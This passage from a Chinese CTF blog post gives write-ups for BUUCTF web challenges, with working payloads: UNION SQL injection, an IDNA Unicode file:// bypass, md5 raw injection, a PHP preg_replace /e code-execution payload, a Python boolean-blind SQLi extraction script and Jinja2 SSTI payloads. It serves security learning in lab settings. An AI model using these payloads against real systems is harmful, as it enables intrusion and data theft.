mysql.innodb_table_stats<br>在其他博客上看到了使用sys的:sys.schema_auto_increment_columns绕过information_schema系列<br>但Buu没得这个系列</p>
<p>payload：</p>
<pre><code class="sql">admin&#39;/**/union/**/all/**/select/**/1,group_concat((select/**/group_concat(c)/**/from/**/(select/**/1,2,3/**/c/**/union/**/select/**/*/**/from/**/users)b)),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;&amp;</code></pre>
<h2><span id="25pythonnginx">25.pythonnginx</span></h2><p>首先是源码审计:</p>
<pre><code class="python">@app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def getUrl():
    url = request.args.get(&quot;url&quot;)
    host = parse.urlparse(url).hostname
    if host == &#39;suctf.cc&#39;:
        return &quot;我扌 your problem? 111&quot;
    parts = list(urlsplit(url))
    host = parts[1]
    if host == &#39;suctf.cc&#39;:
        return &quot;我扌 your problem? 222 &quot; + host
    newhost = []
    for h in host.split(&#39;.&#39;):
        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))
    parts[1] = &#39;.&#39;.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]
    host = parse.urlparse(finalUrl).hostname
    if host == &#39;suctf.cc&#39;:
        return urllib.request.urlopen(finalUrl).read()
    else:
        return &quot;我扌 your problem? 333&quot;

    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;
    &lt;!-- Do you know the nginx? --&gt;</code></pre>
<p>这里先学习一下encode(‘idna’)<br>里面的idna是什么意思。<br>解释什么的百度都有<br>什么是IDN?<br>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p>
<p>什么是idna?<br>A library to support the Internationalised Domain Names in Applications (IDNA) protocol as specified in RFC 5891. This version of the protocol is often referred to as “IDNA2008” and can produce different results from the earlier standard from 2003.<br>主要看例子:</p>
<pre><code class="python">&gt;&gt;&gt; import idna
&gt;&gt;&gt; print(idna.encode(u&#39;ドメイン.テスト&#39;))
结果:xn--eckwd4c7c.xn--zckzah
&gt;&gt;&gt; print idna.decode(&#39;xn--eckwd4c7c.xn--zckzah&#39;)
结果:ドメイン.テスト</code></pre>
<p>这有什么用呢，再看下面这个例子:</p>
<pre><code class="exp">℆这个字符,如果使用python3进行idna编码的话
print(&#39;℆&#39;.encode(&#39;idna&#39;))
结果
b&#39;c/u&#39;
如果再使用utf-8进行解码的话
print(b&#39;c/u&#39;.decode(&#39;utf-8&#39;))
结果
c/u
通过这种方法可以绕过网站的一些过滤字符
摘from：[https://www.cnblogs.com/cimuhuashuimu/p/11490431.html](https://www.cnblogs.com/cimuhuashuimu/p/11490431.html)</code></pre>
<p>正好这道题可以用这个绕过前两个suctf.cc,并且让第三个解码后变成suctf.cc满足条件，从而可以构造file协议读取nginx关键文件。<br>这个其实是出自：今年BlackHat的一个议题，相关PPT如下：<br><a href="Ghttps://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">BlackHat_PPT</a><br>Nginx的配置文件目录为：/usr/local/nginx/conf/nginx.conf</p>
<p>由此可以想到构造：file://suctf.c℆sr/local/nginx/conf/nginx.conf（另一种绕过方式是利用ℂ来代替c及进行绕过），这样可以读到flag的位置：<br>这里发现了这个只在get传参有效，post无效，为什么呢，因为get传参会拼接在Url中，而阅读代码，它会解析url部分，并调用read等方法，而post中的参数就无效了。</p>
<pre><code class="config">server {
    listen 80;
    location / {
        try_files $uri @app;
    }
    location @app {
        include uwsgi_params;
        uwsgi_pass unix:///tmp/uwsgi.sock;
    }
    location /static {
        alias /app/static;
    }
    # location /flag {
    #     alias /usr/fffffflag;
    # }
}</code></pre>
<p>最后构造payload：file://suctf.c℆sr/fffffflag<br>拿到flag,哎又是靠着别人的WP，之后重温习2-3遍，直到完全消化为止，谨记p师傅的忠言，不能不求甚解，做题不能将就。</p>
<h2><span id="26bjdctf2020easy-md5">26.[BJDCTF2020]Easy MD5</span></h2><p>md5($str,true)注入</p>
<pre><code class="sql">&quot;select * from admin where passwd = &#39; &quot; .md5( $password, true). &quot; &#39; &quot;; </code></pre>
<p>这样一个SQL语句其实可以注入<br>先来说一下md5()这个函数<br>    md5(string, raw)         raw 可选，默认为false</p>
<pre><code>true:返回16字符2进制格式

false:返回32字符16进制格式</code></pre><p>简单来说就是 true将16进制的md5转化为字符了,如果某一字符串的md5恰好能够产生如’or ’之类的注入语句，就可以进行注入了.<br>提供一个字符串：ffifdyop<br>md5后，276f722736c95d99e921722cf9ed621c<br>转成字符串后： ‘or’6<trash></trash></p>
<h2><span id="27bjdctf2020mark-loves-cat">27.[BJDCTF2020]Mark loves cat</span></h2><p>先扫描一哈，发现存在.git源码泄露，打开GitHack,获取到index.php里面的重要源码如下:</p>
<pre><code class="php">?php

include &#39;flag.php&#39;;

$yds = &quot;dog&quot;;

$is = &quot;cat&quot;;
$handsome = &#39;yds&#39;;

foreach($_POST as $x =&gt; $y){
    $$x = $y;
}

foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}

foreach($_GET as $x =&gt; $y){
    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
        exit($handsome);
    }
}
if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
    exit($yds);
}
if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
    exit($is);
}

echo &quot;the flag is: &quot;.$flag;</code></pre>
<p>从上往下看下来，很明显$flag里面存的值就是flag的值，但是要绕过这三个if条件，很明显存在变量覆盖漏洞，因而想办法覆盖掉初始变量，绕过判断。<br>第一个条件不好绕过，因而换一种方式传参，可以肯定flag应当用post传。而第二个条件是如果没有设置get的flag就弹出exit值，这与第一个矛盾。由于是变量覆盖，因而应当灵活一点，第一个判断绕过，让弹出的$yds=$flag就可以得到flag.<br>那么就post传参flag=flag,这样</p>
<pre><code class="php">foreach($_POST as $x =&gt; $y){
    $$x = $y;
}
由于上面的，$flag=flag</code></pre>
<p>然后是get传入yds=flag,因为第二个条件不好绕，因而让他弹yds，然后覆盖yds为flag的值</p>
<pre><code class="php">foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}
由这一句传入的yds=flag就变成了，$yds=$flag.</code></pre>
<p>yds值最后被打印，查看源代码即可拿到flag.这里我们还可知道exit的值不会出现在页面上，而源代码中存在。</p>
<pre><code class="php">&lt;?php
$id = $_GET[&#39;id&#39;];
$_SESSION[&#39;id&#39;] = $id;

function complex($re, $str) {
    return preg_replace(
        &#39;/(&#39; . $re . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $str
    );
}


foreach($_GET as $re =&gt; $str) {
    echo complex($re, $str). &quot;\n&quot;;
}

function getFlag(){
    @eval($_GET[&#39;cmd&#39;]);
}</code></pre>
<p>这里主要把这个preg_replace函数搞明白:</p>
<pre><code class="php">preg_replace(
        &#39;/(&#39; . $re . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $str
    )</code></pre>
<p>第一个参数是过滤规则，这个等会儿说是什么规则，然后下一个是过滤后的替换内容，最后是过滤的整个字符串<br>先以它的兄弟函数str_replace为例</p>
<pre><code class="str">str_replace(&#39;abc&#39;,I,&#39;abc love you&#39;)</code></pre>
<p>最后得到的就是I love you了。<br>接着看preg_replace()</p>
<pre><code class="preg">preg_replace(&#39;/(&#39; . $re . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$str)</code></pre>
<p>e 修饰符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。<br>比如:</p>
<pre><code class="php">&lt;?php
preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);
?&gt;
访问的url ： ?h=phpinfo()就会弹出phpinfo</code></pre>
<p>而i(PCRE_CASELESS)如果设置了这个修饰符,则表达式不区分大小写.<br>那么这里该怎么利用呢，先看了一篇大佬的文章，方便理解:<br><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace的深入研究</a><br>文中指出这样的代码最后会执行:</p>
<pre><code class="rce">eval(&#39;strtolower(&quot;\\1&quot;);&#39;) </code></pre>
<p>但这是个什么东西<br>其中的\1就是\1然后\1在正则中有自己的含义:<br>    反向引用</p>
<pre><code>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#39;\n&#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</code></pre><p>所以\1指的是第一个子匹配项，因而根据大佬的payload：<br>    /?.<em>={${phpinfo()}}<br>即 GET 方式传入的参数名为 /?.</em> ，值为 {${phpinfo()}} 。<br>所以有:<br>    原先的语句： preg_replace(‘/(‘ . $regex . ‘)/ei’, ‘strtolower(“\1”)’, $value);<br>    现在的语句： preg_replace(‘/(.<em>)/ei’, ‘strtolower(“\1”)’, {${phpinfo()}});<br>然而事实却没有那么简单，php对于get传入的参数名，会把非法的转换成下划线，<br>    因而.*变成了_</em><br>在上篇文章中提到，只有点号在作为首字母时会被替换成下划线。因而可以换一个payload：</p>
<pre><code class="payload">\S*=${phpinfo()} </code></pre>
<p>所以这里可以看到e修饰符的使用还会使得而须替换过后的成分被解析成php代码执行。因而preg_replace的第二、三参数都可以作为rce的利用点，这道题就是第三个参数的利用。<br>这里还有一个很重要的点(粘贴上面文章内容):<br>    为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)<br>有了这样的基础知识。回到本题即可构造出:</p>
<pre><code class="payload">next.php?\S*=${getflag()}&amp;cmd=show_source(&#39;/flag&#39;);</code></pre>
<p>这里补充说明一点\S是匹配\s相反的内容，而\s匹配空白，因而\S代表非空白就匹配。正好就是用这里需要匹配到后面的${getflag()},而刚好*代表匹配前面的子表达式零次或多次，这样就达到了完全匹配。<br>这里让next.php的内置getflag()函数调用，因而执行后面的cmd函数。这里cmd是在eval中要构成完整的php代码还需要加上最后的;<br>最后拿到flag.</p>
<h2><span id="28blog">28.blog</span></h2>

<p>考的主要是CBC还涉及到二次注入，过程太复杂以后有空来写WP<br>8593206281fd62de<br>859320628333831341fd62de<br>1fd62de85932062833383134<br>859320628<br>33383134<br>1fd62de</p>
<h2><span id="29ciscn2019-华北赛区-day2-web1hack-world">29.[CISCN2019 华北赛区 Day2 Web1]Hack World</span></h2><p>进入页面后直接就是一个表单输入框，然后提示是flag就在flag表中，然后让我们输入id。<br>输入一个1：显示:Hello, glzjin wants a girlfriend.<br>加上引号，bool(false)<br>极有可能是bool盲注<br>使用1^1与1^0,结果分别是:<br>Error Occured When Fetch Result.<br>Hello, glzjin wants a girlfriend.<br>说明就是bool盲注，然后是赵师傅想要女朋友就是正确查询回显。<br>接下来用BP，fuzz一下:<br>发现bool盲注的函数基本上都没ban,写个脚本直接跑出flag：</p>
<pre><code class="payload">import requests
import string
url = &quot;http://9b62ab97-37b4-4721-b023-19815db98f81.node3.buuoj.cn/index.php&quot;

s = &#39;_,1234567890}{-&#39;+ string.ascii_lowercase
flag = &quot;&quot;

for i in range(1,50):
    f=0
    print(i)
    for j in s:
        payload = &quot;1^(ascii(substr((select(flag)from(flag)),{w},1))={z})^1&quot;
        data={&quot;id&quot;:payload.format(w=i,z=ord(j))}
        html = requests.post(url,data=data)
        if &quot;glzjin&quot; in str(html.content):
            f=1
            flag +=j
            print(flag)
            break
    if f==0:
        break
</code></pre>
<p>这里说一下上面的简单小脚本，也涉及到算法复杂度的问题，这样能更快跑出来flag.<br>设置了一个哨兵f，最开始设置为0，我们看到当成功回显了一个flag字母后，立即将其break掉，这样第二个循环不会再接着做而浪费时间。<br>同样，当所有的都破解完后，f==0,整个循环退出，外部循环也节约了时间，无需跑完所有range.</p>
<h2><span id="30gyctf2020flaskapp">30.[GYCTF2020]FlaskApp</span></h2><code class="python">@app.route(&#39;/decode&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])

def decode():

    if request.values.get(&#39;text&#39;) :

        text = request.values.get(&quot;text&quot;)

        text_decode = base64.b64decode(text.encode())

        tmp = &quot;结果 ： {0}&quot;.format(text_decode.decode())

        if waf(tmp) :

            flash(&quot;no no no !!&quot;)

            return redirect(url_for(&#39;decode&#39;))

        res =  render_template_string(tmp)</code>
<p>解法移步本博客SSTI:<a href="https://bephplover.github.io/2020/04/23/Py-SSTI/">py-ssti</a></p>
<h2><span id="31westernctf2018shrine">31.[WesternCTF2018]shrine</span></h2>

<p>打开页面后发现是python代码但是是没有换行的，直接ctrl+u换行。</p>
<pre><code>import flask
import os

app = flask.Flask(__name__)

app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)


@app.route(&#39;/&#39;)
def index():
    return open(__file__).read()


@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
        blacklist = [&#39;config&#39;, &#39;self&#39;]
        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == &#39;__main__&#39;:
    app.run(debug=True)</code></pre><p>看到render_template_string就知道可能存在模板注入了，根据其路由信息。访问</p>
<pre><code class="URL">/shrine/{{2*2}}</code></pre>
<p>结果发现页面返回:</p>
<p><img src="/2020/05/09/BUUCTF-WP/%7B4%7D.png" alt="{4}"></p>
<p>然后看这部分代码:</p>
<pre><code class="python">def safe_jinja(s):
        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
        blacklist = [&#39;config&#39;, &#39;self&#39;]
        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s</code></pre>
<p>会发现传入的参数会经过过滤，也就是self不能用了，config也不能用了，并且采用()的方式调用函数就不行了，那么之前的payload：</p>
<pre><code class="python">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre>
<p>由于payload中包含self所以用不了了。</p>
<p>这里就进入死胡同了，看了师傅的WP发现：</p>
<p>​    <strong>current_app全局变量，url_for和*</strong>get_flashed_messages*</p>
<p>以上几个函数可以使用。我们先试试传入config会怎么样:</p>
<p><img src="/2020/05/09/BUUCTF-WP/none.png" alt="none"></p>
<p>也就是把页面的显示信息替换了None了</p>
<p>重点研究哈师傅的payload吧：</p>
<p>最后的payload：</p>
<pre><code>GET /shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}</code></pre><p>其中current_app是一个全局变量表示当前运行程序文件的程序实例。我没想通的是为什么config依旧可以用。</p>
<pre><code>这里就发现了黑名单的漏洞:return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s

这里其实没有完全过滤，他只是让{{}}中存在的config的话页面值返回none，但config[]就绕过了。</code></pre><p>也就是他只过滤了单独的config而没有考虑其他带有config的形式，这属于不严谨的过滤。</p>
<p>当然url_for中也包含着current_app，因而把get_flashed_messages替换为url_for也可。</p>
<p>这里需要理解的是flask的上下文工作机制。</p>
<p>current_app,g属于应用上下文对象，</p>
<p>current_app也是一个全局变量表示当前运行程序文件的程序实例。</p>
<p>下面通过flask的工作流程说明其用处。</p>
<p>当调用app = Flask(_name_)的时候，创建了程序应用对象app;</p>
<p>而每次请求就会产生request对象。</p>
<p>app对象的生命周期大于request。</p>
<p>一个application存活期间可能发生多次http请求,所以也会有多个request.</p>
<p>请求上下文:保存了客户端和服务器交互的数据。</p>
<p>应用上下文: 在flask程序运行过程中，保存的一些配置信息，例如程序文件名、数据库的连接、用户信息等。</p>
<p>上下文(context)就是语境的意思。</p>
<p>在程序中可以理解为在代码执行某个时刻，根据之前代码所做的操作以及下文即将要执行的逻辑，</p>
<p>可以决定在当前时刻下可以使用到的变量，或者可以做的事情。</p>
<p>Flask中上下文对象:相当于一个容器，保存了Flask程序运行过程的一些信息。</p>
<p>#Misc部分#<br>签到题就不说了，直接粘贴</p>
<p>1.金三胖<br>&emsp;&emsp;这个题有意思啊，三胖的标准鼓掌表情包，送到Stegslove.jar里面把他分成一张张图片来看，即可发现flag.</p>
<p>2.二维码<br>&emsp;&emsp;下载后看到是一张二维码，没有扫，先试试formost，然后发现藏了一个zip文件，密码是4位数字，用AARP暴力破解密码，拿到flag,这里注意哈，题目提示了要改为flag格式，我傻愣愣的以为这是个假flag,又去分析二维码，后来看提示才发现，直接把拿到的CTF改为flag即正确了。</p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7null"></li>
                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7null"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2020/05/09/Py-SSTI/" rel="prev">
              <div class="background">
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                Py-SSTI</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2020/05/07/bWApp-play/" rel="next">
              <div class="background">
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                bWApp_play</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="" itemprop="url" rel="author"></a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i></p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            // PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 Cupid<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2018</p>
    </div>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/custom/namei.jpg">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">Cupid'sblog</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="https://github.com/bephplover" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="https://wpa.qq.com/msgrd?v=3&uin=782377128&site=qq&menu=yes" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/技术/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/内网渗透/">
                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
                  内网渗透
                </a>
              </li>
            
              <li>
                <a href="/categories/编程类/">
                  <i class="fa fa-cloud-download" aria-hidden="true"></i>
                  编程学习
                </a>
              </li>
            
              <li>
                <a href="/categories/Linux/">
                  <i class="fa fa-book" aria-hidden="true"></i>
                  Linux学习
                </a>
              </li>
            
              <li>
                <a href="/categories/CTF/">
                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
                  CTF
                </a>
              </li>
            
              <li>
                <a href="/categories/Web漏洞/">
                  <i class="fa fa-book" aria-hidden="true"></i>
                  Web渗透
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            清单
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/tags/悦读/">
                  <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                  书单
                </a>
              </li>
            
              <li>
                <a href="/music/">
                  <i class="fa fa-headphones" aria-hidden="true"></i>
                  歌单
                </a>
              </li>
            
              <li>
                <a href="/tags/图集/">
                  <i class="fa fa-photo" aria-hidden="true"></i>
                  图集
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我？
                </a>
              </li>
            
              <li>
                <a href="/theme-sakura/">
                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                  主题
                </a>
              </li>
            
              <li>
                <a href="/lab/">
                  <i class="fa fa-cogs" aria-hidden="true"></i>
                  Lab
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/atom.xml">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
            RSS
          </span>
        </a>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
